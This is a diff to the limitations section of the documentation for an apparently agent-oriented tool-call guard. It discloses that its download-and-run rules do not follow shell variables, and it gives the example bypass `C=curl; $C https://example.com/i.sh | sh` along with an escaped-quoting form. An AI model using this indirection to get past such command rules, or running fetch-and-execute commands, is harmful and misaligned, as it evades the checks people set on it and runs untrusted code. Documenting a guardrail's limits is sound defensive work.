@@ -328,5 +328,10 @@ stop malware running as the same user (see above).
 - **Rollback of the vault file:** restoring an older, genuine copy of
   `secrets.age` is accepted, and brings back the approvals and policy it had.
   Keep backups of `~/.zn` private.
+- **Command rules read the quoting of one line, not its variables.** The
+  download-and-run and startup-file rules decode shell quoting before they look
+  at a command (quotes, a backslash inside a word, `$'\x63url'`), but they do not
+  follow a variable: `C=curl; $C https://example.com/i.sh | sh` is not seen. The
+  rules are a guardrail against mistakes, not a sandbox.
 - **Latency:** each hook is a short Node process. Measured about 78 ms p50 per
   tool call on a Windows desktop (`bench/HOOK_LATENCY.md`).
